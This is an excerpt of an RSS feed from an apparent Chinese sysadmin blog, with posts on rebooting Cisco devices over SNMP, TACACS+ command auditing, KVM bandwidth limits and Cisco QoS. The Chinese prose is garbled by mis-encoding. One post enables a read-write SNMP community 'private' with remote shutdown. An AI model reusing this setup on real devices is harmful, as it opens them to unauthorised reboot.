      <description>&lt;p&gt;&lt;a href=&#34;https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html&#34;&gt;https://www.cisco.com/c/en/us/support/docs/smb/routers/cisco-rv-series-small-business-routers/smb4127-configure-simple-network-management-protocol-snmp-on-rv320-a.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™ç¯‡è¯´çš„å¾ˆè¯¦ç»†äº†&lt;/p&gt;
&lt;p&gt;æŒ‰å›¾ç´¢éª¥å³å¯&lt;/p&gt;
&lt;p&gt;snmpwalk v3å‚æ•°è§£é‡Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v 1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2c&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;             specifies SNMP version to use
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-u USER-NAME          &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; security name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e.g. bert&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-l LEVEL              &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; security level &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;noAuthNoPriv&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;authNoPriv&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;authPriv&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a PROTOCOL           &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; authentication protocol &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MD5&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;SHA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-A PASSPHRASE         &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; authentication protocol pass phrase
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-x PROTOCOL           &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; privacy protocol &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DES&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;AES&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-X PASSPHRASE         &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; privacy protocol pass phrase
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç®€å•è¯´ï¼Œv3æ”¯æŒä¸¤é‡åŠ å¯†ï¼Œè¦è¾“å…¥ä¸¤ä¸ªå¯†ç &lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snmpset -v3 -u Cisco -l authPriv -a MD5 -A FuckCisco -x DES -X zhenbushidongxi 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Ciscoäº¤æ¢æœºé€šè¿‡snmpæ¥é‡å¯</title>
      <link>https://rendoumi.com/posts/20240124-cisco_snmp_reboot/</link>
      <pubDate>Wed, 24 Jan 2024 16:07:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-cisco_snmp_reboot/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸ªä»€ä¹ˆå‘½é¢˜ï¼Ÿï¼æ²¡åŠæ³•ï¼Œæœ‰æ—¶å€™éœ€è¦ç”¨åˆ°è¿™ç§æ–¹å¼&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»ciscoäº¤æ¢æœºé…ç½®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snmp-server community private RW  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snmp-server system-shutdown  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååœ¨linuxæœºå™¨ä¸Šæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;!--- This is an explanation of the variables that this &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; uses.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          10.16.99.55 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ip address of your router
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;               &lt;span class=&#34;nv&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; R/W SNMP Community string of your router
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.1.3.6.1.4.1.9.2.9.9.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; tsMsgSend SNMP MIB OID
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Integer as defined SYNTAX in the MIB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                     &lt;span class=&#34;nv&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; reload &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; as defined in the MIB
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åï¼ŒFuck Cisco!!!&lt;/p&gt;</description>
    </item>
    <item>
      <title>Cisco è·¯ç”±å™¨çš„æ“ä½œå®¡è®¡</title>
      <link>https://rendoumi.com/posts/20240124-cisco_audit/</link>
      <pubDate>Wed, 24 Jan 2024 16:06:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-cisco_audit/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬ç”¨çš„æ˜¯Cisco ASR 1001-Xè¿™ä¸ªè·¯ç”±å™¨æ¥åšBGPçš„ã€‚&lt;/p&gt;
&lt;p&gt;å‰ä¸¤å¤©åšå¤šçº¿BGPçš„æ—¶å€™ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯é‡åˆ°Bugäº†ï¼Œè¿˜æ˜¯æ“ä½œé¡ºåºæœ‰é—®é¢˜ï¼Œå¤§æ–­ç½‘ï¼Œç„¶åé‡å¯è·¯ç”±å™¨ã€‚&lt;/p&gt;
&lt;p&gt;äº‹åæƒ³å›é¡¾çš„æ—¶å€™ä¹Ÿæ˜¯å„è‡ªæœ‰å„è‡ªçš„è®°å½•ï¼Œç»†èŠ‚è¯­ç„‰ä¸è¯¦&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;å¹²è„†æ­å»ºä¸€ä¸ªæ—¥å¿—æœåŠ¡å™¨æ¥è®°å½•ä¸‹æ¥æ‰€æœ‰çš„æ“ä½œï¼Œä¾¿äºäº‹åå¤ç›˜&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåœ¨CentOS 7 çš„ç³»ç»Ÿä¸Šå®‰è£…TACACS+è½¯ä»¶ï¼Œå±…ç„¶åœ¨7ä¸Šç”¨çš„æ˜¯6çš„è½¯ä»¶ï¼Œè¿™ç‚¹ä¹Ÿå¾ˆæ€ªå¼‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;/etc/yum.repos.d/tacacs-plus.repo  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[tacacs-plus]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;name=Tacacs Plus  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;enabled=0  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;gpgcheck=1  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…tacacs_plus&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; yum â€“enablerepo&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tacacs-plus install tac_plus
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œæˆ‘ä»¬åªæ˜¯ç”¨tacacs_plusæ¥è®°å½•æ“ä½œæ—¥å¿—ï¼Œä¸æ˜¯ç”¨æ¥é™åˆ¶ç”¨æˆ·ç™»å½•å’Œæƒé™çš„ï¼Œæ‰€ä»¥åªéœ€è¦å…³æ³¨ä¸¤è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/tac_plus.conf  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;FuckFuckFuck&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;accounting &lt;span class=&#34;nv&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/log/tac_acct.log  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨ï¼Œcentos 6 æ²¡æœ‰systemctlï¼Œåªæœ‰service&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service tac_plus start  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ok, tacacs+é…ç½®å¥½äº†ï¼Œç»§ç»­ï¼Œå»Ciscoè·¯ç”±å™¨ä¸Šé…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1#configure terminal  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter configuration commands, one per line.  End with CNTL/Z.  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#tacacs-server host 192.168.171.13  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#tacacs-server timeout 10  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#tacacs-server key FuckFuckFuck  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#aaa new-model  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#aaa accounting commands 0 default stop-only group tacacs+  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#aaa accounting commands 1 default stop-only group tacacs+  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#aaa accounting commands 15 default stop-only group tacacs+  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;config&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#end  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Router1#  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;â€œ0â€ ç”¨æ¥å®¡è®¡exitå’Œendå‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥æ˜ç¡®çŸ¥é“ç”¨æˆ·çš„ç™»å½•ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVMçš„è™šæœºå¦‚ä½•é™é€Ÿ</title>
      <link>https://rendoumi.com/posts/20240124-kvm_limit_bandwidth/</link>
      <pubDate>Wed, 24 Jan 2024 16:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-kvm_limit_bandwidth/</guid>
      <description>&lt;p&gt;éœ€è¦å¼€ä¸€å°kvmçš„æµ‹è¯•æœºï¼Œä½†æ˜¯éœ€è¦é™åˆ¶é€Ÿåº¦ï¼Œ10M&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬çš„ç‰©ç†æœºä½¿ç”¨äº†bridgeï¼Œä»¥åŠvlan tagï¼Œæ‰€ä»¥è™šæœºçš„ç½‘å¡æ˜¯br0.141&lt;/p&gt;
&lt;p&gt;æŸ¥äº†ä¸€åœˆæ–‡æ¡£&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;interface &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bridge&amp;#39;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;mac &lt;span class=&#34;nv&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;52:54:00:db:4c:5f&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;br0.141&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;bandwidth&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;inbound &lt;span class=&#34;nv&#34;&gt;average&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;peak&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;burst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;outbound &lt;span class=&#34;nv&#34;&gt;average&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;peak&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;burst&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1250&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;/bandwidth&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &amp;lt;model &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;virtio&amp;#39;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„é™é€Ÿçš„å•ä½ï¼šæ˜¯kilobyte per second&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼š&lt;/p&gt;
&lt;p&gt;1250 kilobyte per second,  KB/s  = 10 Mbps = 1.25 MB/s&lt;/p&gt;
&lt;p&gt;10 Mbpså°±æ˜¯é€šå¸¸æ„ä¹‰ä¸Šçš„ç½‘é€Ÿï¼Œ/8=1.25 MB/sï¼Œå°±æ˜¯æœºå™¨ä¸Šç”¨ä¸‹è½½è½¯ä»¶æ¯”å¦‚è¿…é›·ä¸‹è½½ï¼Œçœ‹åˆ°çš„é€Ÿåº¦ï¼ˆ1.25 MB/sï¼‰ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ciscoè·¯ç”±å™¨ä¸Šqosçš„è®¾ç½®</title>
      <link>https://rendoumi.com/posts/20240124-cisco_qos/</link>
      <pubDate>Wed, 24 Jan 2024 16:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-cisco_qos/</guid>
      <description>&lt;p&gt;è¯‰æ±‚å¾ˆç®€å•ï¼Œå¯¹å®¢æˆ·é™é€Ÿï¼Œé‚£ä¹ˆéº»çƒ¦å°±å¾ˆå¤šï¼Œæ€ä¹ˆé™ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…ˆæ™®åŠä¸€ä¸‹Ciscoçš„qosçŸ¥è¯†&lt;/p&gt;
&lt;h5 id=&#34;å•é€Ÿå•æ¡¶&#34;&gt;å•é€Ÿå•æ¡¶ï¼š&lt;/h5&gt;
&lt;p&gt;å•é€Ÿå•æ¡¶æ¨¡å¼ä¸å…è®¸æµé‡çªå‘ï¼Œå½“ç”¨æˆ·çš„æµé‡é€Ÿç‡å°äºé…ç½®çš„CIRæ—¶ï¼ŒæŠ¥æ–‡è¢«è®¤ä¸ºæ˜¯conformï¼›å½“ç”¨æˆ·çš„æµé‡å¤§äºCIRæ—¶ç›´æ¥è¢«è®¤ä¸ºæ˜¯exceed(æ€ç§‘exceedåä¸ºviolate)ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240124161128865&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240124-cisco_qos/image-20240124161128865.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;(å›¾ä¸­Tcä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bc)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¦‚æœåªé…ç½®CIRï¼Œä¸æŒ‡å®šBcï¼Œé‚£ä¹ˆé»˜è®¤Bcç­‰äº1500bytesæˆ–è€… CIRæ•°å€¼ / &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; conform-action transmit  exceed-action drop 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police cir &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; conform-action transmit  exceed-action drop 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; conform-action transmit  exceed-action drop 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; class &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  police cir &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; bc &lt;span class=&#34;m&#34;&gt;1500&lt;/span&gt; conform-action transmit  exceed-action drop
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;å•é€ŸåŒæ¡¶&#34;&gt;å•é€ŸåŒæ¡¶ï¼š&lt;/h5&gt;
&lt;p&gt;æ”¯æŒçªå‘æµé‡ï¼Œç”¨æˆ·çš„æµé‡ä¼šå‡ºç°ä¸‰ç§ç»“æœï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240124161359401&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240124-cisco_qos/image-20240124161359401.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;(å›¾ä¸­Tcã€Teä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒEBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)&lt;/p&gt;
&lt;p&gt;å°äºæˆ–ç­‰äºCIRï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆCIRï¼‰ ï¼ˆconformï¼‰
å¤§äºCIRå¹¶å°äºæˆ–ç­‰äºCIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆexceedï¼‰
è¶…è¿‡CIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯è¶…è¿‡ä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆviolateï¼‰&lt;/p&gt;
